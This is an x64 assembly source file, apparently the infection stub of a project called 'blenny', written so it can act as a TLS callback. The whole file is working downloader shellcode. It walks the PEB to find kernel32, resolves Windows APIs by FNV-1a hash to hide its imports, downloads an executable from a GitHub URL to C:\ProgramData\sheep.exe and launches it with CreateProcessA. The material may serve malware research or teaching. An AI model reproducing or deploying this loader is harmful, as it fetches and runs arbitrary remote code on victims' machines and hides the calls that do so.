section .text
[BITS 64]

; %define TLS
   
global main
   ; this is now a TLS callback, which has the following header:
   ;
   ;    VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved)
main:
   mov [rsp+0x20],r12
   mov [rsp+0x18],rsi
   mov [rsp+0x10],rdi
   mov [rsp+8],rbp
   sub rsp,0xf8                 ; store registers in shadow space, realign the stack and create new shadowspace and argspace

%ifdef TLS
   cmp edx,1
   jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                ; otherwise, terminate the infection.
%endif
   
   call infection__data         ; perform a call-pop to get offsets to our data
infection__data__start:         ; this prevents relocations from forming because we are not
infection__data__urlmon:        ; using absolute addresses for our data, making it more portable
   db "urlmon.dll",0
infection__data__sheep:
   db "C:\\ProgramData\\sheep.exe",0
infection__data__download_url:
   db "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",0

infection__data:
   pop rbx                      ; get the pointer to the start of the data
   mov rax, [gs:0x60]           ; get current PEB
   mov rcx, [rax+0x18]          ; peb->Ldr
   mov rax, [rcx+0x10]          ; ldr->InLoadOrderModuleList.Flink (the current module)
   mov rcx, [rax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
   mov rax, [rcx]               ; list_entry->InLoadOrderLinks.Flink (kernel32.dll)
   mov r12, [rax+0x30]          ; list_entry->DllBase
   mov rcx, r12
   mov edx, 0x53b2070f
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x53b2070f)
   mov rdi, rax                 ; get function for LoadLibraryA
   mov rcx, r12
   mov edx, 0xda1a7563
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
   mov rsi, rax                 ; get function for GetFileAttributesA
   mov rcx, r12
   mov edx, 0x4a7c0a09
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x4a7c0a09)
   mov rbp, rax                 ; get function for CreateProcessA
   lea rcx, [rbx+(infection__data__urlmon-infection__data__start)] ; urlmon.dll
   call rdi                                                        ; LoadLibraryA("urlmon.dll")
   mov rcx, rax
   mov edx, 0xd8d746fc
   call get_proc_by_hash        ; get_proc_by_hash(urlmon_module, 0xd8d746fc)
   mov r12, rax                 ; get function for URLDownloadToFileA

   lea rcx, [rbx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
   call rsi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
   cmp eax, 0xFFFFFFFF          ; eax == INVALID_FILE_ATTRIBUTES
   jnz infection__payload_exists ; jump taken means the file exists

   xor ecx,ecx
   lea rdx, [rbx+(infection__data__download_url-infection__data__start)] ; big honkin github url
   lea r8, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
   xor r9d,r9d
   mov [rsp+0x20],rcx
   call r12                     ; URLDownloadToFileA(nullptr, "evil_sheep_url.exe", "C:\\ProgramData\\sheep.exe", 0, nullptr)
   test eax,eax
   jnz infection__end           ; URLDownloadToFileA returning nonzero is an error

infection__payload_exists:
   xor ecx,ecx                                                    ; the executable file (can just use command line arg)
   lea rdx, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
   xor r8d,r8d
   xor r9d,r9d
   xorps xmm0,xmm0
   movups [rsp+0x20],xmm0
   movups [rsp+0x30],xmm0
   lea rax, [rsp+0x70]
   mov [rsp+0x40], rax
   lea rax, [rsp+0x50]
   mov [rsp+0x48], rax
   movups [rsp+0x50],xmm0
   movups [rsp+0x60],xmm0
   mov dword [rsp+0x70], 0x68
   movups [rsp+0x74],xmm0
   movups [rsp+0x84],xmm0
   movups [rsp+0x94],xmm0
   movups [rsp+0xa4],xmm0
   movups [rsp+0xb4],xmm0
   movups [rsp+0xc4],xmm0
   mov [rsp+0xd4],ecx
   call rbp                     ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
   
infection__end:
   add rsp,0xf8
   mov r12,[rsp+0x20]
   mov rsi,[rsp+0x18]
   mov rdi,[rsp+0x10]
   mov rbp,[rsp+8]
   ret
   
   ; rcx: the dll module
   ; rdx: the 32-bit fnv321a hash value to look up
get_proc_by_hash:
   mov [rsp+8],rbx
   mov [rsp+0x10],rsi
   mov [rsp+0x18],rdi
   movsxd rax, dword [rcx+0x3c] ; e_lfanew
   mov r8d, dword [rax+rcx+0x88] ; nt_headers->OptionalHeader.DataDirectory[IMAGE_EXPORT_DIRECTORY] rva
   add r8, rcx                      ; pointer to the export directory
   xor r9d, r9d
   mov r10d, dword [r8+0x20]    ; ExportDirectory.AddressOfNames
   add r10, rcx
   mov r11, rcx                 ; store the dll in a different register
   mov edi, dword [r8+0x24] ; ExportDirectory.AddressOfNameOrdinals
   add rdi, rcx
   mov esi, dword [r8+0x1C] ; ExportDirectory.AddressOfFunctions
   add rsi, rcx
   mov rbx, rdx                 ; store our target hash for later
   mov r8d, dword [r8+0x18] ; ExportDirectory.NumberOfNames

get_proc_by_hash__name_iter:
   mov eax, [r10]               ; name RVA
   add rax, r11                 ; add the base pointer
   mov edx, 0x811c9dc5          ; begin calculating the fnv32-1a hash

get_proc_by_hash__fnv321a:
   movzx ecx, byte [rax]    ; get the byte of the string
   test cl,cl                   ; check for zero
   jz get_proc_by_hash__fnv321a_break ; break on null byte
   
   lea rax,[rax+1]                    ; advance one byte
   xor ecx, edx                       ; hash ^= name[i]
   imul edx, ecx, 0x1000193           ; hash *= 0x1000193
   jmp short get_proc_by_hash__fnv321a

get_proc_by_hash__found_function:
   movzx ecx, word [rdi+r9*2] ; name_ordinals[name_index]
   mov eax, [rsi+rcx*4]           ; functions[name_ordinals[name_index]]
   add rax, r11                   ; add the base pointer
   jmp get_proc_by_hash__epilogue ; function found

get_proc_by_hash__fnv321a_break:
   cmp edx, ebx                 ; check if this hash matches our target hash
   jz get_proc_by_hash__found_function

   inc r9d                      ; iterate to the next name in the list
   add r10, 4
   cmp r9d, r8d
   jb get_proc_by_hash__name_iter
   
get_proc_by_hash__return_nullptr:
   xor rax,rax                  ; ya fucked up, you get a nullptr

get_proc_by_hash__epilogue:
   mov rbx,[rsp+8]
   mov rsi,[rsp+0x10]
   mov rdi,[rsp+0x18]
   ret
   
